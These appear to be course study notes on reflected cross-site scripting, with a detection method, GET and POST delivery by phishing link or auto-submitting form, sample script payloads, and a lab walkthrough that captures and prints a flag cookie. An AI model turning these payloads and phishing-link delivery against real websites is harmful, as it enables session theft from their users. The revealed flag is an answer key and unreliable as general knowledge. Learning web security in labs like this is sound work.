# Section 3 — Reflected XSS

---

## What Makes It Reflected

User input is echoed back in the immediate server response (error messages, search results, parameter echoing) without sanitization. **Not stored** — payload only executes for someone who follows a crafted link/request.

---

## Detection Flow

1. Submit a benign value → confirm it's echoed in the response (`Task 'test' could not be added.`)
2. Replace with XSS payload → confirm execution
3. Refresh the page without re-sending → payload should NOT execute (confirms it's reflected, not stored)

---

## Delivery Mechanism

Reflected XSS needs the victim to send the malicious input themselves. The delivery method depends on the HTTP method:

| Method | How attacker delivers payload |
|--------|-------------------------------|
| GET | Crafted URL with payload in query string (`?task=<script>...`) — sent via phishing link |
| POST | Trickier — needs a malicious page that auto-submits a form, or a CSRF-style attack |

Most reflected XSS in CTFs uses GET — check the Network tab in DevTools to confirm the method.

```bash
# Inspect request method
curl -sk "http://TARGET/index.php?task=test" -v 2>&1 | grep '> '
```

---

## Sample Payloads (same as Stored)

```html
<script>alert(window.origin)</script>
<script>alert(document.cookie)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
```

---

## Lab — Reflected XSS

**Target:** `154.57.164.79:31042`

### Q1 — Flag via cookie disclosure

Same form as Section 2 but reflected — submit the payload as a GET parameter:

```
http://154.57.164.79:31042/index.php?task=<script>alert(document.cookie)</script>
```

The server reflects the payload in the error message and sets a flag cookie in the response. Capture it with curl:

```bash
curl -sk -G "http://154.57.164.79:31042/index.php" \
  --data-urlencode "task=<script>alert(document.cookie)</script>" \
  -i | grep -i set-cookie
# Set-Cookie: cookie=HTB{r3fl3c73d_b4ck_2_m3}
```

**Flag:** `HTB{r3fl3c73d_b4ck_2_m3}`

---

## Exam Notes

- Reflected XSS requires victim interaction (clicking a link) — lower severity than stored, but easy to phish
- The "is it persistent?" check: load the page in a fresh tab without the malicious params → if XSS still fires, it's stored, not reflected
- GET-reflected XSS is the most common variant — search params, error message echoes, URL-based filters
- POST-reflected requires CSRF-style delivery — usually escalates via a separate XSS in another reflected sink
- Even though they're non-persistent, reflected XSS can be devastating with mass phishing (Twitter TweetDeck 2014 = self-retweeting via reflected XSS)
